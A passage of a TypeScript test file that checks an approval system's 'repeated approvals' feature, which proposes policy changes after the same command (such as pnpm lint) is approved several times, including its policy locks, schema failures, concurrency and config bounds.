        const request = await asked(ctx, action, `${ref}${i}`, after(i * 60), action.command ? { command: action.command } : {})
        await verdict(ctx, request, 'approved', after(i * 60 + 5))
      }
      const secret = await command(ctx, LINT, `secret${i}`, after(i * 60), { classification: 'local-private' })
      await verdict(ctx, secret, 'approved', after(i * 60 + 5))
    }
    expect(await approvals.proposeRepeated(after(300))).toBeUndefined()
    expect(ctx.store.db.prepare('SELECT COUNT(*) AS n FROM request_shapes').get()).toEqual({ n: 0 })
    // Where a listed argv would still ask (workspace-write asks), nothing is proposed.
    const asking = await boot({ config: { ...REPEATED, policies: [{ ...STUDIO, rules: STUDIO.rules.map((r) => (r.actionClass === 'workspace-write' ? { actionClass: 'workspace-write', mode: 'ask' } : r)) }, PROJECT, NO_COMMANDS] } })
    await approvedTimes(asking.ctx, LINT, 3)
    expect(await asking.approvals.proposeRepeated(after(300))).toBeUndefined()
    // Where the policy forbids policy changes, nothing is proposed, and no decision is recorded for it.
    const locked = await boot({ config: { ...REPEATED, policies: [{ ...STUDIO, rules: [...STUDIO.rules, { actionClass: 'policy-change', mode: 'forbid' }] }, PROJECT, NO_COMMANDS] } })
    await approvedTimes(locked.ctx, LINT, 3)
    const decisions = (): unknown => locked.ctx.store.db.prepare("SELECT COUNT(*) AS n FROM artifacts WHERE kind = 'decision'").get()
    const before = decisions()
    expect(await locked.approvals.proposeRepeated(after(300))).toBeUndefined()
    expect(decisions()).toEqual(before)
  })

  it('leaves out a command whose stored request fails its schema, logged, and still proposes another (INV-14)', async () => {
    const { ctx, approvals } = await boot({ config: REPEATED })
    const [broken] = await approvedTimes(ctx, LINT, 4)
    await approvedTimes(ctx, ['pnpm', 'build'], 3, after(300), 'b')
    ctx.store.db.prepare('UPDATE approval_requests SET record = ? WHERE request_id = ?').run(JSON.stringify({ ...broken, expiresAt: 'never' }), broken!.requestId)
    const warned = logged(ctx, 'warn')
    expect(await approvals.proposeRepeated(after(600))).toMatchObject({ origin: { shape: { command: 'pnpm build' } } })
    expect(warned.some((m) => m.includes('left the repeated approvals of `pnpm lint` as it was'))).toBe(true)
  })

  it('lets one of two providers over the same store propose, never both (BEGIN IMMEDIATE)', async () => {
    const one = await boot({ config: REPEATED })
    const two = await boot({ dir: one.dir, config: REPEATED })
    await approvedTimes(one.ctx, LINT, 3)
    const proposed = await Promise.all([one.approvals.proposeRepeated(after(300)), two.approvals.proposeRepeated(after(300))])
    expect(proposed.filter(Boolean)).toHaveLength(1)
    expect(await one.approvals.policyChanges()).toHaveLength(1)
    expect(await one.ctx.approvals.list()).toHaveLength(1)
  })

  it('proposes on the queue\'s own clock once configured', async () => {
    const { ctx } = await boot({ clock: true, config: { ...REPEATED, sweepSeconds: 1 } })
    await approvedTimes(ctx, LINT, 3, after(-300, new Date()))
    await vi.waitFor(async () => expect((await ctx.approvals.list()).map((r) => r.action.class)).toEqual(['policy-change']), { timeout: 5000, interval: 100 })
  })

  it('refuses repeatedApprovals out of its bounds, at load and in system check', async () => {
    for (const value of [{ approvals: 2 }, { approvals: 101 }, { windowSeconds: 60 }, { windowSeconds: 7776001 }, { approvals: 3.5 }, { every: 1 }, { enabled: 'yes' }]) {
      expect(checkConfig({ policies: POLICIES, repeatedApprovals: value as RepeatedApprovals }).join('; ')).toMatch(/^repeatedApprovals\./)
    }
    expect(checkConfig({ policies: POLICIES, repeatedApprovals: {} })).toEqual([])
    expect(checkConfig({ policies: POLICIES, repeatedApprovals: { enabled: true, approvals: 100, windowSeconds: 7776000 } })).toEqual([])
    const ctx = new Context()
    const dir = tempDir()
    const fibers = [ctx.plugin(Store, { path: join(dir, 'system.db') }), ctx.plugin(Artifacts, {})]
    await Promise.all(fibers)
    onTestFinished(async () => { for (const f of fibers.reverse()) await f.dispose() })
    const fiber = ctx.plugin(ManualApprovals, { policies: POLICIES, repeatedApprovals: { enabled: true, approvals: 1 } })
    const error = await Promise.resolve(fiber).then(() => undefined, (e: unknown) => e)
    expect(String((error as Error | undefined)?.message)).toMatch(/repeatedApprovals\.approvals/)
    expect(ctx.get('approvals')).toBeUndefined()
    await fiber.dispose()
  })
})
